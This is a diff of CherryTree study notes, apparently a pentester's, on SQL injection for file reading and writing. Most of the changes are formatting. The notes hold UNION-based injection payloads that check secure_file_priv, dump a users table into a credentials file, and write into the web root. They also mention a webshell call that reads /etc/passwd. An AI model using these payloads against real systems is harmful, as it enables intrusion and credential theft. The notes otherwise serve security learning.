@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="28" master_id="0" name="file injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747420178" ts_lastsave="1747437029">
+  <node unique_id="28" master_id="0" name="file injection" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747420178" ts_lastsave="1749201273">
     <rich_text>File Injection:
 </rich_text>
     <rich_text justification="left"></rich_text>
@@ -17,14 +17,20 @@ check for secure_file_priv:
     <rich_text>
 
 with union:
-
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
 if null -&gt; we can r/w everywhere.
 
 Schreiben in file:
-
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
 
 In union:
-
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
 
 webshell usen:
 
@@ -49,9 +55,9 @@ immer shell.php?0=cat /etc/passwd
         <cell>Read local file&#13;</cell>
       </row>
     </table>
-    <codebox char_offset="252" justification="left" frame_width="1642" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"</codebox>
-    <codebox char_offset="267" justification="left" frame_width="1921" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</codebox>
-    <codebox char_offset="323" justification="left" frame_width="746" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT * from users INTO OUTFILE '/tmp/credentials';</codebox>
-    <codebox char_offset="336" justification="left" frame_width="1320" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- </codebox>
+    <codebox char_offset="252" justification="left" frame_width="1758" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"</codebox>
+    <codebox char_offset="267" justification="left" frame_width="2058" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</codebox>
+    <codebox char_offset="323" justification="left" frame_width="798" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">SELECT * from users INTO OUTFILE '/tmp/credentials';</codebox>
+    <codebox char_offset="336" justification="left" frame_width="1413" frame_height="20" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- </codebox>
   </node>
 </cherrytree>
